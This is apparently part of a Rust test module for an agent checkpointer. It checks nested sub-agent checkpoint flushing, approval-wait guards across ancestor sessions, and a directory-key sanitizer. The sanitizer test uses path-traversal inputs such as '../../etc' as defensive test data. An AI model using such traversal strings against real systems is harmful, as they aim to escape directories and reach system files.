        chk.subagent_path = grand.subagent_path().to_vec();
        grand
            .write_park(chk, &crate::SessionArtifacts::new())
            .await
            .unwrap();
        // grandchild park lands two levels down; BOTH ancestors flushed
        assert!(has_park(
            &root.dir().join("children/call_a/children/call_b")
        ));
        assert!(has_park(&root.dir().join("children").join("call_a")));
        assert!(has_park(root.dir()));
    }

    #[test]
    fn sanitize_dir_key_neutralizes_separators_and_dot_prefixes() {
        assert_eq!(sanitize_dir_key("call_1"), "call_1");
        assert!(!sanitize_dir_key("a/b").contains('/'));
        assert!(!sanitize_dir_key("..\\..").contains('\\'));
        assert!(!sanitize_dir_key("../../etc").starts_with('.'));
        assert_eq!(sanitize_dir_key(""), "call");
    }

    #[test]
    fn enter_ask_bumps_self_and_every_ancestor_raii() {
        let dir = tempfile::tempdir().unwrap();
        let root = Checkpointer::new(dir.path().join("checkpoint"), key(), "s1".into());
        let child = root.child(
            "call_a",
            agent_policy::ApprovalOrigin {
                delegation_id: "call_a".into(),
                subagent_name: "x".into(),
                depth: 1,
            },
        );
        let grand = child.child(
            "call_b",
            agent_policy::ApprovalOrigin {
                delegation_id: "sub1:call_b".into(),
                subagent_name: "y".into(),
                depth: 2,
            },
        );
        assert!(!root.is_awaiting_ask());
        assert!(!child.is_awaiting_ask());
        assert!(!grand.is_awaiting_ask());

        let guard = grand.enter_ask();
        assert!(root.is_awaiting_ask());
        assert!(child.is_awaiting_ask());
        assert!(grand.is_awaiting_ask());

        // a second, independent guard at a different level counts separately
        let child_guard = child.enter_ask();
        assert!(child.is_awaiting_ask());

        drop(guard);
        // child's own guard still holds child + root up
        assert!(root.is_awaiting_ask());
        assert!(child.is_awaiting_ask());
        assert!(!grand.is_awaiting_ask());

        drop(child_guard);
        assert!(!root.is_awaiting_ask());
        assert!(!child.is_awaiting_ask());
        assert!(!grand.is_awaiting_ask());
    }
}
